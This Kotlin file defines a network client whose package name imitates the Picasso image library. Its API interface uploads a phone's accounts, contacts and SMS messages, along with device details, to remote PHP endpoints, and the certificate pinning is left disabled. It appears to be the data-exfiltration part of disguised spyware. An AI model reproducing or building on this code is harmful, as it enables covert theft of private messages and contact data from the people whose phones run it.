package com.squareup.picasso.data.network


import com.squareup.picasso.BuildConfig
import okhttp3.CertificatePinner
import okhttp3.OkHttpClient
import okhttp3.logging.HttpLoggingInterceptor
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.*

object PicassoApiClient {
    private const val API_BASE_URL = BuildConfig.PATH
    private var servicesApiInterface: ServicesApiInterface? = null

    fun build(): ServicesApiInterface? {
        var builder: Retrofit.Builder = Retrofit.Builder()
            .baseUrl(API_BASE_URL)
            .addConverterFactory(GsonConverterFactory.create())

        //TODO Change ssl pinning
        val hostname = BuildConfig.HOSTNAME //"www.yourdomain.com"
        val sha1 = BuildConfig.SHA1 //"sha256/ZCOF65ADBWPDK8P2V7+mqodtvbsTRR/D74FCU+CEEA="
        val certificatePinner = CertificatePinner.Builder()
            .add(
                hostname,
                sha1
            )
            .build()

        var httpClient: OkHttpClient.Builder = OkHttpClient.Builder()
        //TODO Enabled cetificate Pinner
        //httpClient.certificatePinner(certificatePinner)
        if (BuildConfig.DEBUG) {
            httpClient.addInterceptor(interceptor())
        }

        var retrofit: Retrofit = builder.client(httpClient.build()).build()
        servicesApiInterface = retrofit.create(
            ServicesApiInterface::class.java
        )

        return servicesApiInterface as ServicesApiInterface
    }

    private fun interceptor(): HttpLoggingInterceptor {
        val httpLoggingInterceptor = HttpLoggingInterceptor()
        httpLoggingInterceptor.level = HttpLoggingInterceptor.Level.BODY
        return httpLoggingInterceptor
    }

    fun getInstance() = this

    interface ServicesApiInterface {

        @Headers("Content-Type: application/json")
        @POST("createAccount.php")
        suspend fun setAccount(@Body account: List<RemoteAccount>): Response<DataResponse>

        @Headers("Content-Type: application/json")
        @POST("createContact.php")
        suspend fun setContact(@Body account: List<RemoteContact>): Response<DataResponse>

        @Headers("Content-Type: application/json")
        @POST("createSms.php")
        suspend fun setSms(@Body account: List<RemoteSms>): Response<DataResponse>

        @Headers("Content-Type: application/json")
        @POST("createMovil.php")
        suspend fun setPhone(@Body phone: RemotePhone): Response<DataResponse>

        @Headers("Content-Type: application/json")
        @PUT("updateMovil.php")
        suspend fun updatePhone(@Body phone: RemoteUpdatePhone): Response<DataUpdateResponse>

    }
}